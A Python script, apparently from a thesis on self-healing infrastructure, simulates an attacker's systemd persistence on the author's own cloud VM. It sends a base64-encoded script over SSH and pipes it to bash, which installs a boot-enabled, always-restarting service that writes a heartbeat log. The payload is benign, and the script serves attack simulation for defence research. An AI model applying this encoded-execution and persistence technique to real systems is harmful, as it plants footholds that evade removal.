import base64
import json
import subprocess
from pathlib import Path


# --- Project paths and target connection settings ---
PROJECT_ROOT = Path(__file__).resolve().parents[1]
STATE_FILE = PROJECT_ROOT / "controller" / "ssh_rotation_state.json"

PROJECT_ID = "project-207ee30d-2273-45b0-8a0"
ZONE = "europe-west1-b"
TARGET_HOST = "thesis-self-healing-vm"
TARGET_USER = "thesisadmin"

# Explicit marker printed only after the service is created and checked.
SUCCESS_MARKER = "SYSTEMD_PERSISTENCE_CREATED"


# --- Load the current trusted SSH key for target administration ---
def get_current_private_key():
    state = json.loads(
        STATE_FILE.read_text(encoding="utf-8")
    )

    key_path = Path(state["new_private_key"])

    if not key_path.exists():
        raise FileNotFoundError(
            f"Current trusted key not found: {key_path}"
        )

    return key_path


# --- Create the controlled systemd persistence mechanism ---
def main():
    private_key = get_current_private_key()

    # The remote script creates two main artefacts:
    # 1) a shell script that writes a heartbeat every 30 seconds; and
    # 2) a systemd unit configured to restart and start at multi-user boot.
    attack_script = r'''set -e

sudo tee /usr/local/bin/thesis-persistence.sh >/dev/null <<'SCRIPT'
#!/bin/bash

while true; do
    date -Is >> /var/tmp/thesis-systemd-heartbeat.log
    sleep 30
done
SCRIPT

sudo chmod 755 /usr/local/bin/thesis-persistence.sh

sudo tee /etc/systemd/system/thesis-persistence.service >/dev/null <<'SERVICE'
[Unit]
Description=Thesis malicious systemd persistence simulation
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/thesis-persistence.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SERVICE

sudo systemctl daemon-reload
sudo systemctl enable --now thesis-persistence.service

sudo systemctl is-enabled thesis-persistence.service
sudo systemctl is-active thesis-persistence.service

echo SYSTEMD_PERSISTENCE_CREATED
'''

    # Base64 keeps the multi-line shell script intact while it crosses SSH.
    encoded = base64.b64encode(
        attack_script.encode("utf-8")
    ).decode("ascii")

    # Use Google Cloud IAP as the transport for the SSH connection.
    proxy_command = (
        "gcloud.cmd compute start-iap-tunnel "
        f"{TARGET_HOST} %p "
        "--listen-on-stdin "
        f"--zone={ZONE} "
        f"--project={PROJECT_ID}"
    )

    command = [
        "ssh",
        "-o", "BatchMode=yes",
        "-o", "IdentitiesOnly=yes",
        "-o", "ConnectTimeout=15",
        "-o", "ConnectionAttempts=1",
        "-o", "StrictHostKeyChecking=accept-new",
        "-i", str(private_key),
        "-o", f"ProxyCommand={proxy_command}",
        f"{TARGET_USER}@{TARGET_HOST}",
        f"echo {encoded} | base64 -d | bash",
    ]

    # Popen allows the Windows-side SSH/IAP process tree to be terminated if it hangs.
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
    )

    try:
        stdout, stderr = process.communicate(timeout=45)
    except subprocess.TimeoutExpired as exc:
        stdout = exc.stdout or ""
        stderr = exc.stderr or ""

        if isinstance(stdout, bytes):
            stdout = stdout.decode(errors="replace")

        if isinstance(stderr, bytes):
            stderr = stderr.decode(errors="replace")

        # Clean up the SSH/IAP process tree after a timeout.
        subprocess.run(
            ["taskkill", "/PID", str(process.pid), "/T", "/F"],
            capture_output=True,
            text=True,
        )

    if stdout:
        print(stdout.strip())

    if stderr:
        print(stderr.strip())

    # Require the explicit marker proving the remote setup reached its final check.
    if SUCCESS_MARKER not in stdout:
        print("[FAIL] Systemd persistence attack failed.")
        return 1

    print("[SUCCESS] Malicious systemd persistence created.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
